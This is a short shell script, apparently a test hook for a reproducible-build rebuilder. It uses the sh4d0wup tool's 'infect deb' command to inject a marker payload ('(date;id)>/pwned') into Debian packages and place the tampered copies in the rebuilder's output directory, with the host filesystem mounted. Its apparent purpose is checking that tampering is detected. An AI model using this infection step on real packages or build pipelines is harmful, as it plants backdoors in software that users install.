#!/bin/sh
for file in "$(dirname "${1}")"/*; do
	name="$(basename "${file}")"
	podman run --rm \
		-v /:/mnt \
		ghcr.io/kpcyrd/sh4d0wup:edge \
		infect deb \
		-v -c '(date;id)>/pwned' \
		"/mnt/${file}" "/mnt/${REBUILDERD_OUTDIR}/${name}"
done
